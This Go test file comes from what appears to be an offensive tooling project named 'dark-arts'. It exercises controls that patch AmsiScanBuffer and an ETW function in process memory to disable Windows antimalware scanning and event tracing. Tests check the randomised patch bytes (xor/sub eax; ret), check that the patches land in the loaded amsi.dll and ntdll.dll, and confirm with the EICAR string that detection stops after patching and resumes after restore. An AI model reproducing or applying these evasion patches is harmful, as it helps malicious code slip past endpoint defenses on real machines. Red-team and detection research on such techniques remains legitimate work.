//go:build windows && amd64

package securityctl

import (
	"syscall"
	"testing"
	"unsafe"

	"dark-arts/pkg/evasion"
)

const (
	amsiResultClean    = 0x00000000 // AMSI_RESULT_CLEAN
	amsiResultDetected = 0x00000001 // AMSI_RESULT_DETECTED
)

var (
	modAMSI             = syscall.NewLazyDLL("amsi.dll")
	procAmsiInitialize  = modAMSI.NewProc("AmsiInitialize")
	procAmsiOpenSession = modAMSI.NewProc("AmsiOpenSession")
	procAmsiScanBuffer  = modAMSI.NewProc("AmsiScanBuffer")
	procAmsiCloseSession = modAMSI.NewProc("AmsiCloseSession")
	procAmsiUninitialize = modAMSI.NewProc("AmsiUninitialize")
)

func TestAMSIControl_FullLifecycle(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if s := a.Status(); s != StatusInitialized {
		t.Errorf("after Initialize: status = %v, want StatusInitialized", s)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if s := a.Status(); s != StatusEnabled {
		t.Errorf("after Enable: status = %v, want StatusEnabled", s)
	}
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	if s := a.Status(); s != StatusDisabled {
		t.Errorf("after Disable: status = %v, want StatusDisabled", s)
	}
	a.Restore()
}

func TestETWControl_FullLifecycle(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if s := e.Status(); s != StatusInitialized {
		t.Errorf("after Initialize: status = %v, want StatusInitialized", s)
	}
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if s := e.Status(); s != StatusEnabled {
		t.Errorf("after Enable: status = %v, want StatusEnabled", s)
	}
	if err := e.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	if s := e.Status(); s != StatusDisabled {
		t.Errorf("after Disable: status = %v, want StatusDisabled", s)
	}
	e.Restore()
}

func TestAMSIControl_PatchIntegrity(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if a.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	orig := make([]byte, len(a.fp.orig))
	copy(orig, a.fp.orig)
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	for i, b := range a.fp.orig {
		if b != orig[i] {
			t.Fatalf("byte %d: got %02x, want %02x after restore", i, b, orig[i])
		}
	}
}

func TestETWControl_PatchIntegrity(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if e.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	orig := make([]byte, len(e.fp.orig))
	copy(orig, e.fp.orig)
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if err := e.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	for i, b := range e.fp.orig {
		if b != orig[i] {
			t.Fatalf("byte %d: got %02x, want %02x after restore", i, b, orig[i])
		}
	}
}

func TestAMSIControl_RestoreIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	a.Restore()
	a.Restore()
}

func TestETWControl_RestoreIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	e.Restore()
	e.Restore()
}

// loadedModuleBase returns the base address of an already-loaded module.
func loadedModuleBase(dllName string) uintptr {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getHandle := k32.NewProc("GetModuleHandleW")
	namePtr, _ := syscall.UTF16PtrFromString(dllName)
	h, _, _ := getHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	return h
}

func TestAMSIControl_TargetsLoadedModule(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if a.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	base := loadedModuleBase("amsi.dll")
	if base == 0 {
		t.Skip("amsi.dll not loaded")
	}
	nt := unsafe.Add(toPtr(base), uintptr(*(*uint32)(unsafe.Add(toPtr(base), 0x3C))))
	opt := unsafe.Add(nt, 0x18)
	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
	if a.fp.addr < base || a.fp.addr >= base+sizeOfImage {
		t.Errorf("AMSI function addr 0x%X is outside loaded amsi.dll range [0x%X, 0x%X)",
			a.fp.addr, base, base+sizeOfImage)
	}
}

func TestETWControl_TargetsLoadedModule(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if e.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	base := loadedModuleBase("ntdll.dll")
	if base == 0 {
		t.Skip("ntdll.dll not loaded")
	}
	nt := unsafe.Add(toPtr(base), uintptr(*(*uint32)(unsafe.Add(toPtr(base), 0x3C))))
	opt := unsafe.Add(nt, 0x18)
	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
	if e.fp.addr < base || e.fp.addr >= base+sizeOfImage {
		t.Errorf("ETW function addr 0x%X is outside loaded ntdll.dll range [0x%X, 0x%X)",
			e.fp.addr, base, base+sizeOfImage)
	}
}

func TestAMSIControl_PatchVisibleAfterEnable(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	defer a.Disable()
	live := make([]byte, 2)
	for i := 0; i < 2; i++ {
		live[i] = *(*byte)(unsafe.Add(toPtr(a.fp.addr), i))
	}
	switch live[0] {
	case 0x33, 0x31, 0x29:
	case 0x48:
		if live[1] != 0x31 {
			t.Errorf("unexpected patch bytes at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
		}
	case 0x45:
		t.Errorf("r8d variant still present in patch at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
	default:
		t.Errorf("unexpected patch bytes at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
	}
}

func TestRandomPatchBytes_AllVariantsSetEAX(t *testing.T) {
	seen := make(map[byte]bool)
	for i := 0; i < 1000; i++ {
		patch := randomPatchBytes()
		switch patch[0] {
		case 0x33:
			if patch[1] != 0xC0 {
				t.Fatalf("invalid xor eax,eax encoding: %02X %02X", patch[0], patch[1])
			}
		case 0x31:
			if patch[1] != 0xC0 {
				t.Fatalf("invalid xor eax,eax encoding: %02X %02X", patch[0], patch[1])
			}
		case 0x29:
			if patch[1] != 0xC0 {
				t.Fatalf("invalid sub eax,eax encoding: %02X %02X", patch[0], patch[1])
			}
		case 0x48:
			if patch[1] != 0x31 || patch[2] != 0xC0 {
				t.Fatalf("invalid xor rax,rax encoding: %02X %02X %02X", patch[0], patch[1], patch[2])
			}
		default:
			t.Fatalf("unexpected patch opcode: %02X (full: %02X)", patch[0], patch[:4])
		}
		retIdx := -1
		for j := 0; j < len(patch); j++ {
			if patch[j] == 0xC3 {
				retIdx = j
				break
			}
		}
		if retIdx < 2 || retIdx > 5 {
			t.Fatalf("ret (C3) not found at expected position: %v", patch)
		}
		seen[patch[0]] = true
	}
	if len(seen) < 4 {
		t.Errorf("only %d unique first bytes seen in 1000 iterations: %v", len(seen), seen)
	}
}

// amsiScan is a crash-safe wrapper around AmsiScanBuffer. AMSI calls from
// Go test binaries can crash non-deterministically if the AMSI subsystem
// is not fully initialized for this process context.
type amsiScanResult struct {
	HRESULT uint32
	Result  uint32
	Crashed bool
}

func amsiScan(session uintptr, buf []byte, name string) (res amsiScanResult) {
	contentName, _ := syscall.UTF16PtrFromString(name)
	func() {
		defer func() {
			if r := recover(); r != nil {
				res.Crashed = true
			}
		}()
		r1, _, _ := procAmsiScanBuffer.Call(
			session,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(contentName)),
			uintptr(unsafe.Pointer(&res.Result)),
		)
		res.HRESULT = uint32(r1)
	}()
	return
}

// TestAMSIControl_FunctionalContract verifies that patching AmsiScanBuffer
// actually changes the function's behavior: detection before patching,
// bypass after patching, detection again after restore. Uses EICAR as
// the test payload. Skips gracefully if AMSI is not functional in the
// test binary process context.
func TestAMSIControl_FunctionalContract(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}

	var ctx uintptr
	appName, _ := syscall.UTF16PtrFromString("DarkArtsTest")
	r1, _, _ := procAmsiInitialize.Call(
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if r1 != 0 {
		t.Skipf("AmsiInitialize failed: 0x%X (AMSI unavailable)", r1)
	}
	defer procAmsiUninitialize.Call(ctx)

	var session uintptr
	r1, _, _ = procAmsiOpenSession.Call(ctx, uintptr(unsafe.Pointer(&session)))
	if r1 != 0 {
		t.Skipf("AmsiOpenSession failed: 0x%X", r1)
	}
	defer procAmsiCloseSession.Call(ctx, session)

	eicar := []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

	// --- BEFORE PATCH: verify AMSI detects EICAR ---
	pre := amsiScan(session, eicar, "eicar.txt")
	if pre.Crashed {
		t.Skip("AmsiScanBuffer crashed before patch — AMSI not functional in this process")
	}
	if pre.HRESULT != 0 {
		t.Skipf("AmsiScanBuffer returned HRESULT 0x%X — AV not active or AMSI not inspecting this binary", pre.HRESULT)
	}
	t.Logf("before patch: result=%d", pre.Result)
	if pre.Result != amsiResultDetected {
		t.Skipf("AmsiScanBuffer returned %d for EICAR (expected %d=DETECTED) — AMSI not inspecting this process", pre.Result, amsiResultDetected)
	}

	// --- APPLY PATCH ---
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	defer a.Disable()

	// --- AFTER PATCH: AmsiScanBuffer should return S_OK (bypass) ---
	post := amsiScan(session, eicar, "eicar.txt")
	if post.Crashed {
		t.Skip("AmsiScanBuffer crashed after patch — cannot verify bypass")
	}
	t.Logf("after patch: HRESULT=0x%X, result=%d", post.HRESULT, post.Result)
	if post.HRESULT != 0 {
		t.Errorf("AmsiScanBuffer returned HRESULT 0x%X after patch (expected S_OK)", post.HRESULT)
	}

	// --- RESTORE ---
	a.Disable()

	// --- AFTER RESTORE: AmsiScanBuffer should detect again ---
	rst := amsiScan(session, eicar, "eicar.txt")
	if rst.Crashed {
		t.Skip("AmsiScanBuffer crashed after restore — cannot verify restore")
	}
	t.Logf("after restore: HRESULT=0x%X, result=%d", rst.HRESULT, rst.Result)
	if rst.HRESULT != 0 {
		t.Errorf("AmsiScanBuffer returned HRESULT 0x%X after restore", rst.HRESULT)
	}
	if rst.Result != amsiResultDetected {
		t.Errorf("after restore: result=%d (expected %d=DETECTED) — prologue may not have been correctly restored", rst.Result, amsiResultDetected)
	}
}
